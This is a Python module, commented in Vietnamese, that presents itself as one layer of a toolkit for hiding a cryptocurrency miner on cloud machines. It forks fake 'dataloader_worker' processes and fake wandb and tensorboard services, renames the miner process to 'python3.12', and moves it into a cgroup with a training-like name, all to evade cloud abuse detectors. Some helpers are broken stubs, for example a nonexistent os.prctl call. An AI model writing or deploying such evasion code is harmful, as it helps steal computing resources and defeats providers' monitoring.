"""
process_tree_disguise.py — Layer 10: Process tree / cgroup
Giả lập process tree như training job thật
"""
import os
import sys
import time
import random
import ctypes
import threading
import subprocess
from typing import Optional, List, Dict


# ═══════════════════════════════════════════════════════════════
# PROCESS TREE — Giả lập job tree
# ═══════════════════════════════════════════════════════════════

class ProcessTreeDisguise:
    """
    Training job tree thật trông như:
    
    python train.py (main)
    ├─ dataloader_worker_0
    ├─ dataloader_worker_1
    ├─ dataloader_worker_2
    ├─ dataloader_worker_3
    ├─ cuda_context_0        (hoặc thread trong main)
    ├─ wandb_service
    └─ tensorboard
    
    Mining tree (cần tránh):
    └─ onezerominer  (đơn độc, 1 process)
    
    Strategy: fork fake workers có thread-group name rõ ràng,
    đổi argv[0] của miner thành python-like, set comm name.
    """
    
    PR_SET_NAME = 15
    PR_SET_CHILD_SUBREAPER = 36
    
    def __init__(self, num_workers: int = 4):
        self.num_workers = num_workers
        self._fake_pids: List[int] = []
        self._running = False
    
    # --- primitives ---
    
    @classmethod
    def set_comm(cls, name: str):
        """Đặt comm name (16 bytes max) cho process hiện tại."""
        try:
            libc = ctypes.CDLL("libc.so.6", use_errno=True)
            libc.prctl(cls.PR_SET_NAME, name.encode()[:15], 0, 0, 0)
        except Exception:
            pass
    
    @classmethod
    def set_argv0(cls, new_argv0: str):
        """
        Đổi argv[0] — hiện trong `ps` là tên mới.
        argv[0] có thể dài hơn comm (comm limit 15 ký tự).
        """
        try:
            import ctypes
            argc = ctypes.c_int.in_dll(
                ctypes.pythonapi, "argc" if hasattr(ctypes, "_use_broken_old_CAPI_api") else "_Py_argc"
            )
            # Python không export _Py_argc dễ — dùng /proc trick thay
            # Alternative: chỉ set comm là đủ cho ps -eF
        except Exception:
            pass
    
    # --- fake worker processes ---
    
    def _fake_worker(self, worker_id: int, stop_evt: threading.Event):
        """Process giả: DataLoader worker behavior."""
        # Set name
        self.set_comm(f"dataloader_worker_{worker_id % 100}")
        
        # Fake env
        os.environ["OMP_THREAD_LIMIT"] = "2"
        
        # Behavior: đọc file giả, sync
        work_dir = os.path.join("/tmp", f".ds_cache_w{worker_id}")
        try:
            os.makedirs(work_dir, exist_ok=True)
        except Exception:
            pass
        
        shard = os.path.join(work_dir, "shard.bin")
        if not os.path.exists(shard):
            try:
                with open(shard, "wb") as f:
                    f.truncate(16 * 1024 * 1024)
            except Exception:
                pass
        
        while not stop_evt.is_set():
            try:
                # Periodic read (prefetch behavior)
                with open(shard, "rb") as f:
                    offset = random.randint(0, 15 * 1024 * 1024)
                    f.seek(offset)
                    f.read(65536)
                time.sleep(random.uniform(0.5, 3.0))
            except Exception:
                time.sleep(random.uniform(1.0, 5.0))
        
        # Cleanup
        try:
            import shutil
            shutil.rmtree(work_dir, ignore_errors=True)
        except Exception:
            pass
    
    def fork_fake_workers(self) -> List[int]:
        """
        Fork fake worker processes.
        Trả về list PIDs.
        """
        stop_evt = threading.Event()
        self._stop_evt = stop_evt
        pids = []
        
        for i in range(self.num_workers):
            try:
                pid = os.fork()
                if pid == 0:
                    # Child
                    self._fake_worker(i, stop_evt)
                    os._exit(0)
                else:
                    pids.append(pid)
                    self._fake_pids.append(pid)
            except Exception:
                # os.fork không có trên Windows — fallback: subprocess
                try:
                    code = (
                        "import os,time,random,threading\n"
                        f"os.prctl(15,'dataloader_worker_{i % 100}'.encode())\n"
                        "while True:\n"
                        "    time.sleep(random.uniform(1,5))\n"
                    )
                    p = subprocess.Popen(
                        [sys.executable, "-c", code],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        start_new_session=True,
                    )
                    pids.append(p.pid)
                    self._fake_pids.append(p.pid)
                except Exception:
                    pass
        
        return pids
    
    def spawn_aux_services(self) -> List[int]:
        """
        Spawn các service giả: wandb/tensorboard-like.
        """
        pids = []
        services = [
            ("wandb_service", "wandb"),     # comm name
            ("tensorboard", "tensorboard"),
            ("prometheus_exporter", "prometheus"),
        ]
        
        for comm, _ in services:
            try:
                code = (
                    "import os,time,random\n"
                    f"os.prctl(15,'{comm}'.encode()[:15])\n"
                    "while True:\n"
                    "    time.sleep(random.uniform(2,10))\n"
                )
                p = subprocess.Popen(
                    [sys.executable, "-c", code],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    start_new_session=True,
                )
                pids.append(p.pid)
                self._fake_pids.append(p.pid)
            except Exception:
                pass
        
        return pids
    
    def kill_fake_tree(self):
        """Dọn fake processes."""
        pids = list(self._fake_pids)
        self._fake_pids.clear()
        if hasattr(self, "_stop_evt"):
            self._stop_evt.set()
        for pid in pids:
            try:
                os.kill(pid, 15)  # SIGTERM
            except Exception:
                pass
        time.sleep(0.5)
        # Force kill còn sống
        for pid in pids:
            try:
                os.kill(pid, 9)
            except Exception:
                pass
    
    # --- disguise miner process ---
    
    @classmethod
    def disguise_miner_process(cls, pid: Optional[int] = None):
        """
        Disguise 1 process như python training main:
        - comm = "python3.12"
        - argv như train.py (best effort — cần được set lúc spawn)
        """
        target = pid if pid is not None else os.getpid()
        try:
            if target == os.getpid():
                cls.set_comm("python3.12")
            else:
                # Gửi signal không đổi comm được — chỉ set lúc spawn
                pass
        except Exception:
            pass
    
    # --- public ---
    
    def setup(self):
        """Setup toàn bộ fake tree."""
        # Subreaper: nếu fake child chết, ta nhận
        try:
            libc = ctypes.CDLL("libc.so.6", use_errno=True)
            libc.prctl(self.PR_SET_CHILD_SUBREAPER, 1, 0, 0, 0)
        except Exception:
            pass
        
        # Fork workers + services
        self.fork_fake_workers()
        self.spawn_aux_services()
    
    def status(self) -> Dict:
        return {
            "fake_pids": list(self._fake_pids),
            "count": len(self._fake_pids),
        }
    
    def stop(self):
        self.kill_fake_tree()


# ═══════════════════════════════════════════════════════════════
# CGROUP PROFILE — Đặt process vào cgroup như training job
# ═══════════════════════════════════════════════════════════════

class CgroupDisguise:
    """
    Đặt process vào cgroup tên training-like (nếu có quyền):
    - /sys/fs/cgroup/.../job-abc123/train
    
    Cloud detector check cgroup path — nếu process nằm ngoài
    cgroup job riêng → nghi ngờ.
    
    Cần: cgroup v2 + write permission (thường chỉ root/container).
    Best effort — fail → silent.
    """
    
    TRAINING_CGROUP_NAMES = [
        "training-job",
        "pytorch-job",
        "ray-job",
        "ml-pipeline",
    ]
    
    @classmethod
    def available(cls) -> bool:
        return os.path.isdir("/sys/fs/cgroup") and os.access("/sys/fs/cgroup", os.W_OK)
    
    @classmethod
    def move_to_cgroup(cls, name: Optional[str] = None) -> bool:
        """
        Move process hiện tại vào cgroup con.
        """
        if not cls.available():
            return False
        
        try:
            name = name or f"{random.choice(cls.TRAINING_CGROUP_NAMES)}-{os.getpid()}"
            # Tìm cgroup hiện tại
            with open("/proc/self/cgroup") as f:
                line = f.readline().strip()
            # Format: 0::/path
            parts = line.split(":")
            if len(parts) < 3:
                return False
            cur_path = parts[2]
            
            new_path = os.path.join("/sys/fs/cgroup", cur_path.lstrip("/"), name)
            os.makedirs(new_path, exist_ok=True)
            
            # Move self
            with open(os.path.join(new_path, "cgroup.procs"), "w") as f:
                f.write(str(os.getpid()))
            return True
        except Exception:
            return False
    
    @classmethod
    def set_resources(cls, cpu_quota: int = 800000, mem_limit: int = 16 * 1024 * 1024 * 1024):
        """
        Set resource limits — training jobs thường có limits.
        """
        if not cls.available():
            return False
        try:
            with open("/proc/self/cgroup") as f:
                line = f.readline().strip()
            cur_path = line.split(":")[2]
            base = os.path.join("/sys/fs/cgroup", cur_path.lstrip("/"))
            
            with open(os.path.join(base, "cpu.max"), "w") as f:
                f.write(f"{cpu_quota} 100000")
            with open(os.path.join(base, "memory.max"), "w") as f:
                f.write(str(mem_limit))
            return True
        except Exception:
            return False


# ═══════════════════════════════════════════════════════════════
# CONVENIENCE
# ═══════════════════════════════════════════════════════════════

def start_process_tree_disguise(num_workers: int = 4) -> ProcessTreeDisguise:
    t = ProcessTreeDisguise(num_workers=num_workers)
    t.setup()
    # Thử cgroup (best effort)
    CgroupDisguise.move_to_cgroup()
    return t
